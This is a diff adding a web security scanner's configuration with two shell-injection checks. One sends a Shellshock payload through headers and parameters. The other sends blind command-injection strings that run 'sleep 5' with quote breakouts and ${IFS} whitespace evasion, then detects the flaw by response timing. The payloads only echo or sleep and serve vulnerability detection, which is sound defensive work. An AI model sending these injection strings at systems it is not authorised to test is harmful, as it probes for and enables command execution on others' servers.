@@ -1,0 +1,110 @@
+# This configuration holds security checks for remote shell injection
+# vulnerabilities.
+security_test <
+  name: "shellshock reflective"
+  issue_type: SHELL_INJECTION
+
+  generator_rule <
+    method: APPEND_TO_VALUE
+    method: SET_VALUE
+    encoding: NONE
+    encoding: URL
+    encoding: HTML
+
+    target <
+      type: HEADERS
+      target_name: "User-Agent"
+    >
+    target <
+      type: URL_PARAMS
+    >
+    target <
+      type: BODY_PARAMS
+    >
+
+    payload <
+      type: STRING
+      arg: "() { :; }; echo Content-Type: text/plain; echo; echo; echo -n shell:; echo -n $$:shock:$((21*2));"
+    >
+  >
+
+  matching_rule <
+    condition <
+      target: RESPONSE_BODY
+
+      match <
+        method: REGEX
+        value: "shell:\\d+:shock:42"
+      >
+    >
+  >
+
+  allow_serial_evaluation: true
+  advisory <
+    severity: HIGH
+    title: "A shell injection vulnerability was detected (shellshock)."
+    description: ""
+    recommendation: ""
+  >
+>
+
+security_test <
+  name: "blind shell injection"
+  issue_type: BLIND_SHELL_INJECTION
+
+  generator_rule <
+    method: APPEND_TO_VALUE
+    encoding: NONE
+    encoding: URL
+
+    target <
+      type: HEADERS
+      target_name: "User-Agent"
+    >
+    target <
+      type: URL_PARAMS
+    >
+    target <
+      type: BODY_PARAMS
+    >
+    target <
+      type: PATH_ELEMENTS
+      last_field_only: true
+    >
+
+    payload <
+      type: STRING
+      arg: "`sleep 5||sleep${IFS}5`"
+      # Inject in single, double and unquoted commands.
+      arg: "';sleep 5;'\";sleep 5;\";sleep 5;"
+      arg: "';sleep${IFS}5;'\";sleep${IFS}5;\";sleep${IFS}5;"
+      # If the previous command was successful, this will sleep 5 seconds
+      # regardless of whether the application strips whitespaces.
+      arg: "&&sleep 5||&&sleep{IFS}5;"
+      # Similar to the above but for the case where the previous command
+      # failed (seems more likely).
+      arg: "||sleep 5||sleep{IFS}5;"
+    >
+  >
+
+  matching_rule <
+    condition <
+      target: RESPONSE_BODY
+      match <
+        method: TIMING
+        timing <
+          min_duration_ms: 5000
+          max_duration_ms: 5500
+        >
+      >
+    >
+  >
+
+  allow_serial_evaluation: true
+  advisory <
+    severity: HIGH
+    title: "A blind shell injection vulnerability was detected."
+    description: ""
+    recommendation: ""
+  >
+>
